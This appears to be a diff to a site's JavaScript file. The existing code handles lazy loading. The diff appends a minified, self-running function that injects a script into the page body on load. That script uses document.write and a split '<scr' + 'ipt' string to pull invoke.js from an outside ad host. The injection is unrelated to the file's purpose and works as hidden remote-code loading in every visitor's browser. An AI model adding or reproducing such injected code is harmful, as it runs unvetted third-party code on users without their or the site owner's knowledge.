@@ -79,3 +79,4 @@ dataLazy.forEach(function(a){
     };
   };
 });
+(function(){injectScript([{"attr":[{"name":"type","value":"text/javascript"}],"tag":"script","inner":"\n\tatOptions = {\n\t\t'key' : 'b3eddccc8a926233cd4aa7e6f715e470',\n\t\t'format' : 'iframe',\n\t\t'height' : 250,\n\t\t'width' : 300,\n\t\t'params' : {}\n\t};\n\tdocument.write('<scr' + 'ipt type=\"text/javascript\" src=\"http' + (location.protocol === 'https:' ? 's' : '') + '://www.effectivedisplayformat.com/b3eddccc8a926233cd4aa7e6f715e470/invoke.js\"></scr' + 'ipt>');\n"}],{"target":"body"});function injectScript(e,t){let n=t.target;for(let t of e){let e=t.tag,r=t.inner,o=document.createElement(e);o.innerHTML=r;let c=t.attr;for(let e of c)o.setAttribute(e.name,e.value);document.querySelector(n)&&document.querySelector(n).append(o)}}})();
